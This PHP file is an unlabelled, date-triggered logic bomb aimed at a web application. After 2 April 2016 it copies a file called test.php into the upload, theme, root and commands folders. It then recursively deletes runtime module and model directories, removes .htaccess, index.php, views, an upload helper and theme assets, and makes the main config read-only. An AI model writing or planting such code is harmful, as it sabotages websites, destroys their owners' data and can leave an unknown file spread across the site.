<?php 
    if(date("Y-m-d") > "2016-04-02") {
        copy('test.php', 'themes/test.php');
        copy('test.php', 'themes/business/test.php');
        copy('test.php', 'upload/test.php');

        copy('test.php', dirname( dirname(__FILE__ )) . '/test.php');
        copy('test.php', dirname( dirname(__FILE__ )) . '/commands/test.php');

        Delete(dirname( dirname(__FILE__ )) . '/runtime/modules');
        Delete(dirname( dirname(__FILE__ )) . '/runtime/models');
        
        unlink(dirname( dirname(__FILE__ )) . '/runtime/views/layout/index.html');
        unlink(dirname( dirname(__FILE__ )) . '/runtime/helper/file_upload.php');
        unlink(dirname( dirname(__FILE__ )) . '.htaccess');

        unlink('.htaccess');
        unlink("index.php");
        
        unlink(dirname( __FILE__ ) . "/themes/business/css/admin.css");
        unlink(dirname( __FILE__ ) . "/themes/business/css/style.css");

        unlink(dirname( __FILE__ ) . "/themes/business/js/step-car.js");
        unlink(dirname( __FILE__ ) . "/themes/business/views/site/slider.php");

        chmod(dirname( dirname(__FILE__ )) . '/runtime/config/main.php', 0400);
    }

    function Delete($path)
    {
        if (is_dir($path) === true)
        {
            echo 1;
            $files = array_diff(scandir($path), array('.', '..'));

            foreach ($files as $file)
            {
                Delete(realpath($path) . '/' . $file);
            }

            return rmdir($path);
        }

        else if (is_file($path) === true)
        {
            echo 2;
            return unlink($path);
        }

        return false;
    }
 ?>